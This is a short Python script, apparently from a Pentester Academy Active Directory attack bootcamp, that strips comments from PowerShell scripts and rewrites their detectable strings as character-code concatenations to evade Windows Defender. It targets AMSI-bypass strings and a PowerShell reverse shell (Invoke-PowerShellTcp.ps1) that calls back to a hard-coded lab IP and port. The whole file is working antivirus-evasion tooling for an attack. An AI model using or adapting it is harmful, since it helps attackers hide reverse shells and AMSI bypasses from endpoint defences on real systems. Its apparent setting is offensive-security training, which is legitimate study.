#!/usr/bin/python3

# Purpose of this script - Take a powershel script and obfuscate it for strings that windows defender recognizes
# Built during the bootcamp from Pentester Academy Attacking and Defending Active Directory

import re

def removeComments(f):
    modFile = f
    modFile = re.sub(re.compile("<#.*?#>",re.DOTALL ), "", modFile) # Remove multi-line comment from powershell
    modFile = re.sub("\#.*", "", modFile) # Remove single-line comments from powershell
    modFile = re.sub(r'\n\s*\n','\n', modFile,re.MULTILINE) # Remove blank lines from the scripts
    #modFile = re.sub("^$", "", modFile) # Remove blank lines
    return modFile



def obfuscate(f):
    modFile = f
    # Transform List for v2amsibypass.txt and powershellOneLineRevShell.ps1
    transformValueList = ["SetValue", "'amsiInitFailed'", "'System.Management.Automation.AmsiUtils'"]
    #transformValueList.append("New-Object")
    transformValueList.append("GetStream")
    # IP Address
    transformValueList.append("'172.16.99.56'")
    # Port
    transformValueList.append("8092")
    transformValueList.append("System.Net.Sockets.TCPClient")
    transformValueList.append("Net.Sockets.TCPClient")
    transformValueList.append("System.Text.ASCIIEncoding")
    transformValueList.append("Text.ASCIIEncoding")
    transformValueList.append("Length")
    for transformValue in transformValueList:
        charList = list(transformValue)
        outputString = "("
        for c in charList:
            # Remove invalid characters after transformation
            if c not in "'":
                outputString += "[char][byte]" + str(ord(c)) + "+"
        outputString = outputString[:-1]
        outputString += ")"
        #print(outputString)
        modFile = modFile.replace(transformValue, outputString)
        #$transformValue = "GetBytes"
        #$output = ""
        #ForEach ($letter in $transformValue.ToCharArray()) {
        # Convert the letters into the decimal number representation of the character
        #    $dec = [byte][char]$letter
        #    $output += "[char][byte]" + [string]$dec + "+"
        #}
        #$output -replace ".$"
    return modFile



def main():
    #fileName = "v2amsibypass.txt"
    fileName = "Invoke-PowerShellTcp.ps1"
    originalScript = "/home/kali/PTA/AttackDefense/Tools/" + fileName
    outputScript = "/home/kali/PTA/AttackDefense/Tools/Modified/mod-" + fileName 
    script = open(originalScript).read()
    output = removeComments(script)
    output = obfuscate(output)
    f = open(outputScript, 'w')
    f.write(output)
    f.close()



if __name__ == "__main__":
    main()

